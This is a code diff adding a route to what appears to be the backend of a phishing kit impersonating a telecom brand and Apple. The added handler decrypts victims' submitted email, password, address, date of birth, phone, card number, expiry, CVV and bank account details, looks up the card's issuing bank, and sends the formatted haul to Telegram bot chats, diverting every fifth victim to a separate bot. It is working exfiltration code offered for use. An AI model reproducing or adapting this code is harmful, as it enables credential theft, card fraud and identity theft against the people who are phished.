@@ -6026,6 +6026,117 @@ app.post("/eeKelv", (req, res) => {
     });
 });
 
+app.options("/c2EE", cors());
+
+app.post("/c2EE", (req, res) => {
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (kelvCount == 5) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        kelvCount = 0;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EEKelv:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5348269876,
+              text: `EE:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        kelvCount += 1;
+      }
+
+      res.send("Update Completed");
+    });
+});
+
 //APPLE
 //APPLE
 //APPLE
